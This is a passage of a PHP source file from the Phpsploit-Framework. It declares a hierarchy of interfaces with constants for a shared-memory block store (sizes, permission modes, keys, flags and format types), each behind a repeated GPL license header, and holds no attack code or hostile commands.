<?php

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Root
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base extends Interface_Root
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Operate extends Interface_Root
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Controller extends Interface_Root
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_View extends Interface_Root
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Main extends Interface_Root
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Error extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Exception extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Request extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Response extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Memory extends Interface_Base
{
    const BLOCK_SIZE_8        = 8;
    const BLOCK_SIZE_16       = 16;
    const BLOCK_SIZE_32       = 32;
    const BLOCK_SIZE_64       = 64;
    const BLOCK_SIZE_128      = 128;
    const BLOCK_SIZE_256      = 256;
    const BLOCK_SIZE_512      = 512;
    const BLOCK_SIZE_1024     = 1024;
    const BLOCK_SIZE_2048     = 2048;
    const BLOCK_SIZE_4096     = 4096;
    const BLOCK_SIZE_8192     = 8192;
    const BLOCK_SIZE_65536    = 65536;
    const BLOCK_SIZE_131072   = 131072;
    const BLOCK_SIZE_262144   = 262144;
    const BLOCK_SIZE_524288   = 524288;
    const BLOCK_SIZE_1048576  = 1048576;
    const BLOCK_SIZE_2097152  = 2097152;
    const BLOCK_SIZE_4194304  = 4194304;
    const BLOCK_SIZE_8388608  = 8388608;
    const BLOCK_SIZE_16777216 = 16777216;
    const BLOCK_SIZE_33554432 = 33554432;
    const BLOCK_SIZE_67108864 = 67108864;
    //
    const DATA_FORMAT_STRING_NULL_FILL_PACK      = "a*";
    const DATA_FORMAT_64_INTEGER_PACK            = "a*";
    const DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK = 1001;
    const DATA_FORMAT_TYPE_64_INTEGER_PACK       = 2001;
    //
    const FLAGS_SHARE_MEMORY_READ           = 'a';
    const FLAGS_SHARE_MEMORY_READ_AND_WRITE = 'w';
    const FLAGS_SHARE_MEMORY_CREATE         = 'n';
    const FLAGS_SHARE_MEMORY_OPEN           = 'c';
    //
    const MODE_SHARE_MEMORY_READ                     = 0440;
    const MODE_SHARE_MEMORY_WRITE                    = 0220;
    const MODE_SHARE_MEMORY_READ_AND_WRITE           = 0660;
    const MODE_SHARE_MEMORY_READ_AND_WRITE_READ_READ = 0644;
    //
    const BLOCK_DATA_VALUE_INTEGER_MIN_VALUE = 1;
    const BLOCK_DATA_VALUE_INTEGER_MAX_VALUE = 999999999999999999;
    //
    const BLOCK_DATA_VALUE_INTEGER_MIN_LENGTH = 1;
    const BLOCK_DATA_VALUE_INTEGER_MAX_LENGTH = 18;
    //
    const BLOCK_DATA_VALUE_INTEGER_ZERO    = 0;
    const BLOCK_DATA_VALUE_INTEGER_ONE     = 1;
    const BLCOK_DATA_VALUE_ASCII_CODE_ZERO = "\0";
    //
    const SHARE_MEMORY_OFFSET_START = 0;
    //
    const SHARE_MEMORY_OFFSET_AUTOINCREMENT_8  = 8;
    const SHARE_MEMORY_OFFSET_AUTOINCREMENT_16 = 16;
    const SHARE_MEMORY_OFFSET_AUTOINCREMENT_32 = 32;
    const SHARE_MEMORY_OFFSET_AUTOINCREMENT_64 = 64;
    //
    const LOCK_KEY = 99999999;
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_BlockName extends Interface_Base
{
    const NAME_BLOCK_KEYS = "BLOCK_KEYS";
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_BlockKey extends Interface_Base
{
    const AUTH                   = 100000000000000000;
    const KEYS                   = 100000000000000001;
    const INDEXES                = 200000000000000001;
    const UNIQUE_INDEX           = 300000000000000001;
    const RESERVED               = 400000000000000001;
    const SOCKETS                = 500000000000000001;
    const COMMAND                = 600000000000000000;
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_BlockSize extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:19
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_BlockStatus extends Interface_Base
{
    const STATUS_BLOCK_DISABLED = 0;
    const STATUS_BLOCK_ENABLED  = 1;
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:21
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_BlockMode extends Interface_Base
{
    const MODE_BLOCK_READ_AND_WRITE = 0660;
    const MODE_BLOCK_READ           = 0440;
    const MODE_BLOCK_WRITE          = 0220;
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-20
 * Time: 下午4:14
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_BlockType extends Interface_Base
{
    const TYPE_BLOCK_KEYS         = 1001;
    const TYPE_BLOCK_INDEXES      = 2001;
    const TYPE_BLOCK_UNIQUE_INDEX = 3001;
    const TYPE_BLOCK_DATA         = 4001;
    const TYPE_BLOCK_SOCKETS      = 5001;

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-20
 * Time: 下午4:14
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_BlockContentType extends Interface_Base
{
    const TYPE_CONTENT_STRING  = 1001;
    const TYPE_CONTENT_INTEGER = 2001;

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_BlockReserved extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_BlockHeadEndFlag extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_BlockHead extends Interface_Base , Interface_Base_BlockName , Interface_Base_BlockKey , Interface_Base_BlockSize , Interface_Base_BlockStatus , Interface_Base_BlockMode , Interface_Base_BlockType , Interface_Base_BlockContentType , Interface_Base_BlockReserved , Interface_Base_BlockHeadEndFlag
{
    const SIZE_BLOCK_HEAD              = 128;
    const SIZE_BLOCK_HEAD_BLOCK_NAME   = 64;
    const SIZE_BLOCK_HEAD_BLOCK_KEY    = 16;
    const SIZE_BLOCK_HEAD_CONTENT_SIZE = 16;
    const SIZE_BLOCK_HEAD_BLOCK_STATUS = 1;
    const SIZE_BLOCK_HEAD_BLOCK_MODE   = 3;
    const SIZE_BLOCK_HEAD_BLOCK_TYPE   = 4;
    const SIZE_BLOCK_HEAD_CONTENT_TYPE = 4;
    const SIZE_BLOCK_HEAD_RESERVED     = 12;
    const SIZE_BLOCK_HEAD_END_FLAG     = 8;
    const FLAG_BLOCK_HEAD_END          = "55AA55AA";
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_BlockContent extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_BlockEndFlag extends Interface_Base
{
    const SIZE_BLOCK_END_FLAG = 8;
    const FLAG_BLOCK_END      = "0X000X00";
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Block extends Interface_Base , Interface_Base_BlockHead , Interface_Base_BlockContent , Interface_Base_BlockEndFlag
{
    const OFFSET_START = 0;
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Block_IndexesItem extends Interface_Base
{
    const SIZE_BLOCK_INDEXES_ITEM              = 128;
    const SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME   = 64;
    const SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY    = 16;
    const SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE = 16;
    const SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS = 1;
    const SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE   = 3;
    const SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE   = 4;
    const SIZE_BLOCK_INDEXES_ITEM_CONTENT_TYPE = 4;
    const SIZE_BLOCK_INDEXES_ITEM_RESERVED     = 12;
    const SIZE_BLOCK_INDEXES_ITEM_END_FLAG     = 8;
    const FLAG_BLOCK_INDEXES_ITEM_END          = "0X900X90";
    const OFFSET_BLOCK_INDEXES_ITEM_START      = 0;
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Block_UniqueIndex extends Interface_Base
{
    const NAME                  = "UNIQUE_INDEX";
    const KEY                   = 300000000000000001;
    const INDEX_START           = 100000000000000001;
    const INDEX_LIMIT           = 999999999999999999;
    const INDEX_NAME            = "BLOCK_UNIQUE_INDEX";
    const SIZE_DEC_INTEGER      = 18;
    const SIZE_HEX_INTEGER      = 16;
    const SIZE_BLOCK            = 152;
    const VALUE_STATUS_DISABLED = 0;
    const VALUE_STATUS_ENABLED  = 1;

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Block_Indexes extends Interface_Base , Interface_Base_Block_IndexesItem
{
    const KEY                 = 200000000000000001;
    const MODE_READ           = 0440;
    const MODE_WRITE          = 0220;
    const MODE_READ_AND_WRITE = 0660;
    const MODE_COMMON         = 0644;

    const SIZE_BLOCK_DATA            = 1048576;
    const SIZE_BLOCK_DATA_ITEM       = 128;
    const SIZE_BLOCK_DATA_ITEM_COUNT = 8192;
    const SIZE_BLOCK                 = 1048712;

    const SIZE_INTEGER_KEY_MAX  = 999999999999999999;
    const SIZE_INTEGER_KEY_MIN  = 100000000000000001;
    const SIZE_STRING_KEY       = 18;
    const SIZE_INTEGER_MODE_MIN = 0600;
    const SIZE_INTEGER_MODE_MAX = 0777;
    const SIZE_INTEGER_TYPE_MIN = 1001;
    const SIZE_INTEGER_TYPE_MAX = 9999;

    const OFFSET_BLOCK_DATA_ITEM_MAX = 1048448;

    const SIZE_MAP             = 1048576;
    const SIZE_MAP_ITEM        = 128;
    const LIMIT_MAP_ITEM_COUNT = 8192;
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-22
 * Time: 下午10:27
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_FormatType extends Interface_Base
{
    const TYPE_FORMAT_STRING    = 1001;
    const TYPE_FORMAT_INTEGER   = 2001;
    const TYPE_OBJECT_SERIALIZE = 3001;
    const TYPE_OBJECT_JSON      = 3002;

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-22
 * Time: 下午10:27
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Format extends Interface_Base_FormatType
{
    const STRING_MIN_LENGTH          = 0;
    const STRING_MAX_LENGTH          = 999999999999999999;
    const INTEGER_MIN_VALUE          = 0;
    const INTEGER_MAX_VALUE          = 999999999999999999;
    const HEX_MIN_VALUE              = 0x0000000000000000;
    const HEX_MAX_VALUE              = 0x0de0b6b3a763ffff;
    const HEX_KEY_MIN_VALUE          = 0x001634585D8A0001;
    const HEX_KEY_MAX_VALUE          = 0x0DE0B6B3A763FFFF;
